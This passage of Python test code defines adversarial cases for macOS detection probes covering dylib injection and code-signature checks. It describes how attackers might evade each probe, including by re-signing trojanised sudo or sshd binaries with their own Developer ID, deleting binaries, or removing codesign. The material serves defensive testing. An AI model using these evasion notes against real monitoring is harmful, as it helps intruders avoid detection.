        "via LC_LOAD_DYLIB, DYLD_LIBRARY_PATH swapping, or mach_inject "
        "are outside its detection scope."
    ),
    events=[],
    expect_count=0,
    expect_evades=True,
    patch_targets=_dylib_patches(_dylib_ps_no_dyld()),
)

_DYLIB_BENIGN1 = AdversarialCase(
    id="dylib_benign1_dyld_library_path",
    title="DYLD_LIBRARY_PATH (search path) — probe correctly ignores",
    category="benign",
    description=(
        "A developer uses DYLD_LIBRARY_PATH to test a locally-built library. "
        "This is library search-path configuration, not injection."
    ),
    why=(
        "probe checks 'DYLD_INSERT_LIBRARIES' not in line → skips this process. "
        "DYLD_LIBRARY_PATH is a path override, not injection — correctly ignored."
    ),
    events=[],
    expect_count=0,
    patch_targets=_dylib_patches(_dylib_ps_no_dyld()),
)

_DYLIB_BENIGN2 = AdversarialCase(
    id="dylib_benign2_dyld_framework_path",
    title="DYLD_FRAMEWORK_PATH — not DYLD_INSERT_LIBRARIES, 0 events",
    category="benign",
    description=(
        "An app bundle sets DYLD_FRAMEWORK_PATH to find its bundled frameworks. "
        "Standard macOS app packaging; probe correctly ignores it."
    ),
    why=(
        "probe's string check: 'DYLD_INSERT_LIBRARIES' not in line → continue. "
        "Only DYLD_INSERT_LIBRARIES triggers dylib injection detection."
    ),
    events=[],
    expect_count=0,
    patch_targets=_dylib_patches(_dylib_ps_framework()),
)

dylib_injection_scenario = register(
    Scenario(
        probe_id="dylib_injection",
        agent="proc",
        name="dylib_injection",
        title="Dylib Injection via DYLD_INSERT_LIBRARIES — T1547 / T1574.006",
        description=(
            "Tests DylibInjectionProbe's ps-based DYLD_INSERT_LIBRARIES detection. "
            "Evasions: non-Darwin platform, ps failure, and using LC_LOAD_DYLIB "
            "binary patching instead of env var injection."
        ),
        mitre_techniques=["T1547", "T1574.006"],
        mitre_tactics=["persistence", "privilege_escalation"],
        probe_factory=DylibInjectionProbe,
        cases=[
            _DYLIB_POS1,
            _DYLIB_POS2,
            _DYLIB_POS3,
            _DYLIB_EVA1,
            _DYLIB_EVA2,
            _DYLIB_EVA3,
            _DYLIB_BENIGN1,
            _DYLIB_BENIGN2,
        ],
    )
)


# =============================================================================
# 10. CodeSigningProbe — invalid code signatures on critical binaries (T1036)
# =============================================================================
#
# macOS-only. Runs codesign --verify --deep on CRITICAL_BINARIES.
# Fires HIGH when returncode != 0 and the binary exists.


def _cs_patches(
    subprocess_mock,
    platform_os: str = "Darwin",
    exists: bool = True,
    target_path: str | None = None,
) -> dict:
    if target_path is not None:
        exists_fn = lambda p: p == target_path
    else:
        exists_fn = lambda p: exists
    return {
        _PA: True,
        _PF: lambda: platform_os,
        _OE: exists_fn,
        _SR: subprocess_mock,
    }


_CS_POS1 = AdversarialCase(
    id="cs_pos1_sudo_tampered",
    title="Tampered /usr/bin/sudo — codesign fails, code_signature_invalid HIGH",
    category="positive",
    description=(
        "Attacker replaced /usr/bin/sudo with a trojanised binary. "
        "codesign --verify fails (returncode=1) → HIGH alert."
    ),
    why=(
        "os.path.exists('/usr/bin/sudo')=True; "
        "codesign returns 1 → code_signature_invalid HIGH."
    ),
    events=[],
    expect_count=1,
    expect_event_types=["code_signature_invalid"],
    expect_severity=Severity.HIGH,
    patch_targets=_cs_patches(_codesign_fail(), target_path="/usr/bin/sudo"),
)

_CS_POS2 = AdversarialCase(
    id="cs_pos2_bash_replaced",
    title="Replaced /bin/bash — codesign fails HIGH",
    category="positive",
    description=(
        "Attacker replaced /bin/bash with a backdoored version that passes "
        "casual inspection but has an invalid or stripped code signature."
    ),
    why=(
        "os.path.exists('/bin/bash')=True; codesign returns 1 → "
        "code_signature_invalid HIGH for /bin/bash."
    ),
    events=[],
    expect_count=1,
    expect_event_types=["code_signature_invalid"],
    expect_severity=Severity.HIGH,
    patch_targets=_cs_patches(_codesign_fail(), target_path="/bin/bash"),
)

_CS_POS3 = AdversarialCase(
    id="cs_pos3_sshd_replaced",
    title="Backdoored /usr/sbin/sshd — codesign fails HIGH",
    category="positive",
    description=(
        "Attacker replaced sshd with a backdoored binary to intercept "
        "all SSH sessions. Invalid signature detected."
    ),
    why=("os.path.exists('/usr/sbin/sshd')=True; codesign returns 1 → HIGH."),
    events=[],
    expect_count=1,
    expect_event_types=["code_signature_invalid"],
    expect_severity=Severity.HIGH,
    patch_targets=_cs_patches(_codesign_fail(), target_path="/usr/sbin/sshd"),
)

_CS_EVA1 = AdversarialCase(
    id="cs_eva1_linux",
    title="Linux platform — probe skips (darwin-only), 0 events",
    category="evasion",
    description=(
        "CodeSigningProbe exits immediately on non-Darwin platforms. "
        "codesign is macOS-specific; the probe provides no coverage on Linux."
    ),
    why=(
        "platform.system()='Linux' ≠ 'Darwin' → probe returns [] immediately. "
        "Linux binary tampering is undetected by this probe."
    ),
    events=[],
    expect_count=0,
    expect_evades=True,
    patch_targets=_cs_patches(_codesign_fail(), platform_os="Linux"),
)

_CS_EVA2 = AdversarialCase(
    id="cs_eva2_binary_deleted",
    title="Binary absent from disk — os.path.exists=False, 0 events",
    category="evasion",
    description=(
        "Attacker replaced /usr/bin/sudo but then deleted the original file "
        "and re-linked. Or the binary path is a symlink that probe resolves to "
        "a non-existent path. os.path.exists() returns False → probe skips."
    ),
    why=(
        "os.path.exists() → False for all CRITICAL_BINARIES → probe never calls "
        "codesign → 0 events. Binary-path manipulation evades this check."
    ),
    events=[],
    expect_count=0,
    expect_evades=True,
    patch_targets=_cs_patches(_codesign_fail(), exists=False),
)

_CS_EVA3 = AdversarialCase(
    id="cs_eva3_codesign_not_found",
    title="codesign not installed — FileNotFoundError, 0 events",
    category="evasion",
    description=(
        "The codesign binary is unavailable (non-standard macOS image, "
        "container, or attacker removed Xcode command-line tools). "
        "Probe silently fails and returns 0 events."
    ),
    why=(
        "subprocess.run raises FileNotFoundError → caught as "
        "FileNotFoundError, logged at debug → returns []. "
        "Environments lacking codesign provide no signing verification."
    ),
    events=[],
    expect_count=0,
    expect_evades=True,
    patch_targets=_cs_patches(_codesign_missing(), target_path="/usr/bin/sudo"),
)

_CS_BENIGN1 = AdversarialCase(
    id="cs_benign1_all_valid",
    title="All critical binaries pass codesign — 0 events (healthy system)",
    category="benign",
    description=(
        "Standard macOS system where all critical binaries have valid Apple "
        "code signatures. Probe correctly returns 0 events."
    ),
    why=(
        "codesign returns 0 for all binaries → no code_signature_invalid events. "
        "Clean system correctly produces zero alerts."
    ),
    events=[],
    expect_count=0,
    patch_targets=_cs_patches(_codesign_ok()),
)

_CS_BENIGN2 = AdversarialCase(
    id="cs_benign2_resigned_by_attacker",
    title="Attacker re-signed with own cert — codesign returns 0, 0 events",
    category="benign",
    description=(
        "Sophisticated attacker replaced /usr/bin/sudo and re-signed it with "
        "their own Developer ID certificate. codesign --verify returns 0 "
        "(valid signature) even though it's the wrong authority."
    ),
    why=(
        "codesign returns 0 → probe sees valid signature → 0 events. "
        "Probe uses --verify without --require-revocation or trusted-cert "
        "constraints. An attacker with a valid Apple Developer ID can re-sign "
        "tampered binaries and evade this check entirely."
    ),
    events=[],
    expect_count=0,
    patch_targets=_cs_patches(_codesign_ok(), target_path="/usr/bin/sudo"),
)

code_signing_scenario = register(
    Scenario(
        probe_id="code_signing",
        agent="proc",
        name="code_signing",
        title="Code Signature Verification — T1036 / T1070.005",
        description=(
            "Tests CodeSigningProbe's codesign --verify --deep checks on critical "
            "macOS binaries. Evasions: non-Darwin platform, binary path manipulation, "
            "codesign unavailable, and re-signing with own Developer ID certificate."
        ),
        mitre_techniques=["T1036", "T1070.005"],
        mitre_tactics=["defense_evasion"],
        probe_factory=CodeSigningProbe,
        cases=[
            _CS_POS1,
            _CS_POS2,
            _CS_POS3,
            _CS_EVA1,
            _CS_EVA2,
            _CS_EVA3,
            _CS_BENIGN1,
            _CS_BENIGN2,
        ],
    )
)
